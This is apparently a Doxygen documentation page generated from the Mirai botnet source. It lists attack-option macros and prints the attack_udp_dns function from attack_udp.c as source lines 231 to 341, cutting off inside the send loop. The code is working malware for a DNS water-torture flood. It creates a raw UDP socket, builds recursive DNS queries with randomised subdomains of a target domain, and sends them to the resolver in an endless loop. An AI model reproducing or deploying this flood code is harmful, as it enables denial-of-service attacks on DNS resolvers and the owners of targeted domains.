<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="protocol_8h_html_a0ac41cedcfd51c915345550521966281"><div class="ttname"><a href="protocol_8h.html#a0ac41cedcfd51c915345550521966281">PROTO_TCP_OPT_MSS</a></div><div class="ttdeci">#define PROTO_TCP_OPT_MSS</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00029">protocol.h:29</a></div></div>
<div class="ttc" id="attack_8h_html_a4464ea34ef73875f57b5c6a412aaac20"><div class="ttname"><a href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a></div><div class="ttdeci">#define ATK_OPT_RST</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00060">attack.h:60</a></div></div>
<div class="ttc" id="protocol_8h_html_a7685648be6843dc7a65440e8696044d1"><div class="ttname"><a href="protocol_8h.html#a7685648be6843dc7a65440e8696044d1">PROTO_TCP_OPT_SACK</a></div><div class="ttdeci">#define PROTO_TCP_OPT_SACK</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00031">protocol.h:31</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html_a5a6f282c43f088516dce2de1b69ae7d8"><div class="ttname"><a href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a></div><div class="ttdeci">#define ATK_OPT_URG</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00057">attack.h:57</a></div></div>
<div class="ttc" id="attack_8h_html_a97b7c19adba8f5e25d603d4fcd80c995"><div class="ttname"><a href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a></div><div class="ttdeci">#define ATK_OPT_SEQRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00063">attack.h:63</a></div></div>
<div class="ttc" id="protocol_8h_html_af4ea7ee9b6b8b13a589a2276719c1ea6"><div class="ttname"><a href="protocol_8h.html#af4ea7ee9b6b8b13a589a2276719c1ea6">PROTO_TCP_OPT_WSS</a></div><div class="ttdeci">#define PROTO_TCP_OPT_WSS</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00030">protocol.h:30</a></div></div>
<div class="ttc" id="attack_8c_html_a51262dda96f2861dbd13fc0b6f0a31d3"><div class="ttname"><a href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a></div><div class="ttdeci">uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00216">attack.c:216</a></div></div>
<div class="ttc" id="attack_8h_html_a2ad2949e3a473ebba047e474abf5d461"><div class="ttname"><a href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a></div><div class="ttdeci">#define ATK_OPT_FIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00062">attack.h:62</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="attack_8h_html_a61c202b303f42c57328c999b1104877d"><div class="ttname"><a href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a></div><div class="ttdeci">#define ATK_OPT_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00058">attack.h:58</a></div></div>
<div class="ttc" id="attack_8h_html_a5ae76926414352bb8e12896c5581a0fd"><div class="ttname"><a href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a></div><div class="ttdeci">#define ATK_OPT_PSH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00059">attack.h:59</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="attack_8h_html_a0fcd18d4c1705cc62b8a2d3f92e0a780"><div class="ttname"><a href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a></div><div class="ttdeci">#define ATK_OPT_ACKRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00064">attack.h:64</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="aa6e206675e668d9ef1a931bdac2cb42e"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_udp_dns </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__udp_8c_source.html#l00230">230</a> of file <a class="el" href="attack__udp_8c_source.html">attack_udp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00055">ATK_OPT_DNS_HDR_ID</a>, <a class="el" href="attack_8h_source.html#l00054">ATK_OPT_DOMAIN</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain()</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="attack__udp_8c_source.html#l00479">get_dns_resolver()</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::id</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::opts</a>, <a class="el" href="protocol_8h_source.html#l00026">PROTO_DNS_QCLASS_IP</a>, <a class="el" href="protocol_8h_source.html#l00025">PROTO_DNS_QTYPE_A</a>, <a class="el" href="protocol_8h_source.html#l00012">dns_question::qclass</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::qdcount</a>, <a class="el" href="protocol_8h_source.html#l00012">dns_question::qtype</a>, <a class="el" href="rand_8c_source.html#l00056">rand_alphastr()</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00072">util_memcpy()</a>, and <a class="el" href="mirai_2bot_2util_8c_source.html#l00021">util_strlen()</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;{</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 53);</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;    uint16_t dns_hdr_id = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a6fb76834fa13fd65a0021d1860b6c1d6">ATK_OPT_DNS_HDR_ID</a>, 0xffff);</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;    uint8_t <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 12);</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;    <span class="keywordtype">char</span> *<a class="code" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a> = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4c326567294cc6655e9f6a380c7f736f">ATK_OPT_DOMAIN</a>, NULL);</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;    <span class="keywordtype">int</span> domain_len;</div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#aaadf2e480fd246ff9e932039b223baed">ipv4_t</a> dns_resolver = <a class="code" href="attack__udp_8c.html#adfa54637caaee478d9038b78415a8d7f">get_dns_resolver</a>();</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;    <span class="keywordflow">if</span> (domain == NULL)</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;    {</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;        printf(<span class="stringliteral">&quot;Cannot send DNS flood without a domain\n&quot;</span>);</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;    }</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;    domain_len = <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(domain);</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;    {</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;    }</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;    i = 1;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;    {</div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;    }</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;    {</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;        <span class="keywordtype">int</span> ii;</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;        uint8_t curr_word_len = 0, num_words = 0;</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;        <span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *dnsh;</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;        <span class="keywordtype">char</span> *qname, *curr_lbl;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;        <span class="keyword">struct </span><a class="code" href="structdns__question.html">dns_question</a> *dnst;</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;        pkts[i] = calloc(600, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;        udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;        dnsh = (<span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *)(udph + 1);</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;        qname = (<span class="keywordtype">char</span> *)(dnsh + 1);</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdnshdr.html">dnshdr</a>) + 1 + data_len + 2 + domain_len + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdns__question.html">dns_question</a>));</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;        iph-&gt;protocol = IPPROTO_UDP;</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;        iph-&gt;saddr = <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>;</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;        iph-&gt;daddr = dns_resolver;</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;        udph-&gt;source = htons(sport);</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;        udph-&gt;dest = htons(dport);</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;        udph-&gt;len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdnshdr.html">dnshdr</a>) + 1 + data_len + 2 + domain_len + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdns__question.html">dns_question</a>));</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;        dnsh-&gt;<a class="code" href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">id</a> = htons(dns_hdr_id);</div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;        dnsh-&gt;<a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a> = htons(1 &lt;&lt; 8); <span class="comment">// Recursion desired</span></div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;        dnsh-&gt;<a class="code" href="structdnshdr.html#a85cb57fcbd654e84d28c30e5bfa844c4">qdcount</a> = htons(1);</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;        <span class="comment">// Fill out random area</span></div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;        *qname++ = <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a>;</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;        qname += <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a>;</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;        curr_lbl = qname;</div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a8654e276185a2f53935614d38f4117f3">util_memcpy</a>(qname + 1, domain, domain_len + 1); <span class="comment">// Null byte at end needed</span></div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;        <span class="comment">// Write in domain</span></div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;        <span class="keywordflow">for</span> (ii = 0; ii &lt; domain_len; ii++)</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;        {</div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;            <span class="keywordflow">if</span> (domain[ii] == <span class="charliteral">&#39;.&#39;</span>)</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;            {</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;                *curr_lbl = curr_word_len;</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;                curr_word_len = 0;</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;                num_words++;</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;                curr_lbl = qname + ii + 1;</div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;            }</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;            <span class="keywordflow">else</span></div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;                curr_word_len++;</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;        }</div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;        *curr_lbl = curr_word_len;</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;        dnst = (<span class="keyword">struct </span><a class="code" href="structdns__question.html">dns_question</a> *)(qname + domain_len + 2);</div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;        dnst-&gt;<a class="code" href="structdns__question.html#a28612cf31ea9061817c7652d97f68f10">qtype</a> = htons(<a class="code" href="protocol_8h.html#a83ac410cc49f839586f7c3f67c82a8fd">PROTO_DNS_QTYPE_A</a>);</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;        dnst-&gt;<a class="code" href="structdns__question.html#afe96f7c0e33a7f83e289140633217017">qclass</a> = htons(<a class="code" href="protocol_8h.html#a901b19f9dfb79c07984d5f8bf8b2a62c">PROTO_DNS_QCLASS_IP</a>);</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;    }</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;    {</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;        {</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;            <span 